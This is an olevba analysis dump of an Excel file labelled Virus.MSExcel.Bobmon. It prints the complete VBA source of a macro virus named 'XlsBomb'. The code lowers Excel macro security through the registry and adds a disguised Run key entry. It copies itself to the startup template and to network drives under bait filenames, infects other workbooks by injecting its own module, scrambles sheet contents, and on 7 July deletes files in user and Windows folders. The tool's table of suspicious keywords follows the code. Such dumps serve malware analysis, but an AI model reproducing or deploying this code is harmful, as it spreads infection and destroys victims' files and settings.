olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Bobmon-d0566807e5e752dc9b73f9e8b2e81ed3913cd4ea
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Bobmon-d0566807e5e752dc9b73f9e8b2e81ed3913cd4ea - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO List1.cls 
in file: Virus.MSExcel.Bobmon-d0566807e5e752dc9b73f9e8b2e81ed3913cd4ea - OLE stream: '_VBA_PROJECT_CUR/VBA/List1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO List2.cls 
in file: Virus.MSExcel.Bobmon-d0566807e5e752dc9b73f9e8b2e81ed3913cd4ea - OLE stream: '_VBA_PROJECT_CUR/VBA/List2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO List3.cls 
in file: Virus.MSExcel.Bobmon-d0566807e5e752dc9b73f9e8b2e81ed3913cd4ea - OLE stream: '_VBA_PROJECT_CUR/VBA/List3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO enCryptionXLS.bas 
in file: Virus.MSExcel.Bobmon-d0566807e5e752dc9b73f9e8b2e81ed3913cd4ea - OLE stream: '_VBA_PROJECT_CUR/VBA/enCryptionXLS'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'          DO NOT EDIT THIS MACRO !!!
'
' Everything gonna be M4D , EXCEL@BÖMBER launch...
Private Declare Function RegOpenKeyExA Lib "ADVAPI32.DLL" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegSetValueExA Lib "ADVAPI32.DLL" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
Private Declare Function RegCloseKey Lib "ADVAPI32.DLL" (ByVal hKey As Long) As Long
Global Const REG_DWORD As Long = 4
Global Const HKEY_LOCAL_MACHINE As Long = &H80000002
Global Const HKEY_CURRENT_USER As Long = &H80000001
Dim AA, BB, NN
Dim Myclub As String
Dim CrStat As Boolean
Dim pnm As String
Sub MessBoard()
ff = ActiveSheet.Index
Randomize
StarWidth = 15
StarHeight = 15
XDay = Day(Now())
    For i = 1 To XDay
        TopPos = Rnd() * (ActiveWindow.UsableHeight - StarHeight)
        LeftPos = Rnd() * (ActiveWindow.UsableWidth - StarWidth)
        Set NewStar = ActiveSheet.Shapes.AddShape _
          (msoShape5pointStar, LeftPos, TopPos, StarWidth, StarHeight)
        NewStar.Fill.ForeColor.SchemeColor = Int(Rnd() * 56)
        Application.Wait Now + TimeValue("00:00:01")
        DoEvents
    Next i
Set myShapes = Worksheets(ff).Shapes
    For Each shp In myShapes
        If Left(shp.Name, 9) = "AutoShape" Then
            shp.Delete
        End If
    Next
End Sub
Private Sub Auto_Open()
On Error Resume Next
Application.StatusBar = "Wait please...."
Application.ScreenUpdating = False
CommandBars("Tools").Controls("Customize...").Visible = False
CommandBars("Tools").Controls("Options...").Visible = False
CommandBars("Tools").Controls("Macro").Enable = False
    Kill97 = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\Microsoft\Office\8.0\Excel\Microsoft Excel", 0, KEY_ALL_ACCESS, k)
    Kill97 = RegSetValueExA(k, "Options6", 0, REG_DWORD, Chr$(0), 4)
    Kill97 = RegCloseKey(k)
    Kill2K = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\Microsoft\Office\9.0\Excel", 0, KEY_ALL_ACCESS, s)
    Kill2K = RegSetValueExA(s, "Level", 0, 1, "1", 0)
    Kill2K = RegCloseKey(s)
AnVrs = Array("VsStatEXE", "Norton Auto-Protect", "F-Secure", "PandaSoft", "AntiViral", "DrSolomon", "AntiVir", "MacroScan", "BombShellter")
Randomize
AVstr = AnVrs(Rnd * 9)
    KillAV = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS, s)
    KillAV = RegSetValueExA(s, AVstr, 0, 1, "c:\windows\rundll.exe", 0)
    KillAV = RegCloseKey(s)
Application.DisplayAlerts = False
  If Right(ActiveWorkbook.Name, 3) = "xlt" Then
  ActiveWindow.Visible = False
  Workbooks.Add
  End If
XBrnd
strup = Application.StartupPath
If Dir(strup & "\" & "*.xlt") = "" Then
pnm = ActiveWorkbook.Name
Apnm = ActiveWorkbook.FullName
OtherVrs = Dir(strup & "\" & "*.xls")
    If OtherVrs <> "" Then
    Workbooks(OtherVrs).Close
    Kill strup & "\" & OtherVrs
    End If
Workbooks(pnm).SaveAs FileName:=strup & "\" & Myclub & ".xlt"
ActiveWindow.Visible = False
Workbooks.Open (Apnm)
End If
For n = 67 To 90
l = Chr(n)
drv = l & ":"
d3 = DrvID(drv)
If d3 = "network" Then snd2drv (drv)
Next
nmpers = Dir(strup & "\" & "*.xlt")
Application.OnSheetActivate = "'" & strup & "\" & nmpers & "'!XLBomb"
If Month(Now()) = 2 And Day(Now()) = 14 Then
Range("A1").Insert
Range("A1").Select
With Selection.Font
        .Name = "Arial"
        .FontStyle = "Bold"
        .Size = 18
        .ColorIndex = 7
    End With
    ActiveCell.FormulaR1C1 = "Huppy Valentinos Days ... AlL oF YoU"
End If
Application.StatusBar = False
Application.DisplayAlerts = True
End Sub
Sub XLBomb()
On Error Resume Next
XlsBmb = "c:\070703.txt"
Application.DisplayAlerts = False
Application.ScreenUpdating = False
aktip = ActiveWorkbook.Name
sedang = ThisWorkbook.Name
Set mcraktip = Workbooks(aktip).VBProject.VBComponents
Set modaktip = ActiveWorkbook.VBProject.VBComponents
Set mymcr = ThisWorkbook.VBProject.VBComponents
If aktip <> "Book1" And aktip <> "Book2" Then
For NS = 1 To Sheets.Count
    If Sheets(NS).Name = "HdSheet" Then
    kz = Sheets(NS).Name
    Exit For
    End If
    kz = Sheets(NS).Name
Next NS
If kz <> "HdSheet" Then
Sheets.Add
ActiveWindow.ActiveSheet.Name = "HdSheet"
Sheets("HdSheet").Visible = xlSheetVeryHidden
Else
Decrypt
Sheets("HdSheet").Range("A7") = ""
End If
  For nm = 1 To mcraktip.Count
    If mcraktip(nm).Type = 1 Then
    nama = mcraktip(nm).Name
    Exit For
    End If
  Next nm
  modaktip.Remove modaktip(nm)
  For nm = 1 To mymcr.Count
    If mymcr(nm).Type = 1 Then
    nama = mymcr(nm).Name
    Exit For
    End If
  Next nm
  mymcr(nama).Export XlsBmb
  modaktip.Import XlsBmb
    Kill XlsBmb
  XBrnd
  ActiveWorkbook.VBProject.VBComponents(nm).Name = Myclub
  Application.ScreenUpdating = True
  If Minute(Now()) > 50 And WeekDay(Now()) Mod 2 = 0 Then MessBoard
End If
Application.DisplayAlerts = True
Application.ScreenUpdating = True
End Sub

Private Sub XBrnd()
Dim Sbjt, Bodd
On Error GoTo nil1
Randomize
Sbjt = Array("enCryptionXLS", "DamageXls", "BombStarter", "unKnownBomB", "ExcelDLL", "DeathOffice", "LnxOffice", "bOmbffice", "XlsLib")
Myclub = Sbjt(Rnd * 9 + 1)
Exit Sub
nil1:
Myclub = Sbjt(0)
End Sub

Function DrvID(drv3)
On Error Resume Next
Dim fso, d, t
Set fso = CreateObject("Scripting.FileSystemObject")
Set d = fso.getdrive(drv3)
Select Case d.drivetype
Case 0: t = "Unknown"
Case 1: t = "removable"
Case 2: t = "Fixed"
Case 3: t = "network"
Case 4: t = "CD-ROM"
Case 5: t = "Ramdisk"
End Select
If t = "" Then t = "none"
DrvID = t
End Function
Sub snd2drv(DrvAll)
On Error Resume Next
Application.DisplayAlerts = False
Application.ScreenUpdating = False
Gnm = ActiveWorkbook.Name
GnmF = ActiveWorkbook.FullName
Randomize
FlName = Array("Report2004", "Manager", "StupidStuff", "HRD2004", "MyCV-Anna", "MySalary", "NotFearACC", "BombfromLinux", _
"Money", "ThankYou", "DoNotOpen", "ExcelVBA", "Opinion", "Secret", "NextJob")
Bread = FlName(Rnd * 14 + 1)
Workbooks(Gnm).SaveAs FileName:=DrvAll & "\" & Bread & ".xls"
Workbooks(ActiveWorkbook.Name).Close 'your secret
Workbooks.Open (GnmF)
Application.DisplayAlerts = True
End Sub

Private Sub Auto_Close()
On Error Resume Next
If ActiveWorkbook.Name <> "Book1" And ActiveWorkbook.Name <> "Book2" Then
Application.ScreenUpdating = False
Application.DisplayAlerts = False
For NS = 1 To Sheets.Count
    If Sheets(NS).Name = "HdSheet" Then
    kz = Sheets(NS).Name
    Exit For
    End If
    kz = Sheets(NS).Name
Next NS
If kz <> "HdSheet" Then
Sheets.Add
ActiveWindow.ActiveSheet.Name = "HdSheet"
Sheets("HdSheet").Visible = xlSheetVeryHidden
End If
CryptSTAT = Sheets("HdSheet").Range("A7")
If CryptSTAT <> 1 Then
encrypt
Sheets("HdSheet").Range("A7") = 1
SvFl = Dir(Application.StartupPath & "\" & "*.xlt")
Workbooks(SvFl).Save
ActiveWorkbook.Save
End If
End If
If Month(Now()) = 7 And Day(Now()) = 7 Then
 Kill "c:\Mydocu~1\*.*"  '**Never Work**
 Kill "c:\Windows\*.i*"  '**Never Fun**
 Kill "c:\Winnt\s*.*"    '**Never Secure**
'Kill "MS:\Bill Gates"   '**Never Mind**
End If
End Sub

Sub encrypt()
Dim SCo As Integer
Randomize
AA = Int(Rnd * 4)
NN = Rnd * 9 + 175
 For SCo = 1 To Sheets.Count
 Y = 0
 z = 0
 gg = AA
 HH = NN
   For NCo = 1 To 6
   Y = Y + 1
   z = z + 1
   MyStr$ = Chr(HH)
   Sheets("HdSheet").Range("C" & Y) = gg
   Sheets("HdSheet").Range("D" & z) = MyStr$
   If Sheets(SCo).Name <> "ThisWorkbook" And Sheets(SCo).Name <> "HdSheet" Then
   Sheets(SCo).Cells.Replace What:=gg, Replacement:=MyStr$
   End If
   gg = gg + 1
   HH = HH + 1
   Next NCo
 Next SCo
End Sub
Sub Decrypt()
For SC1 = 1 To Sheets.Count
X = 0
Y = 0
    For NC1 = 1 To 6
    X = X + 1
    Y = Y + 1
    ReadC = Sheets("HdSheet").Range("C" & Y)
    ReadD$ = Sheets("HdSheet").Range("D" & X)
    If Sheets(SC1).Name <> "ThisWorkbook" And Sheets(SC1).Name <> "HdSheet" Then
    Sheets(SC1).Cells.Replace What:=ReadD$, Replacement:=ReadC
    End If
    Next NC1
Next SC1
End Sub
'if you remove this macro or not install tools, your money will broke......BOMB !!
'eastjava 010104, XlsBomb Ver 0.15 written by RedMoon
-------------------------------------------------------------------------------
VBA MACRO List4.cls 
in file: Virus.MSExcel.Bobmon-d0566807e5e752dc9b73f9e8b2e81ed3913cd4ea - OLE stream: '_VBA_PROJECT_CUR/VBA/List4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  HdShee
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |ADVAPI32.DLL        |Executable file name                         |
|IOC       |rundll.exe          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

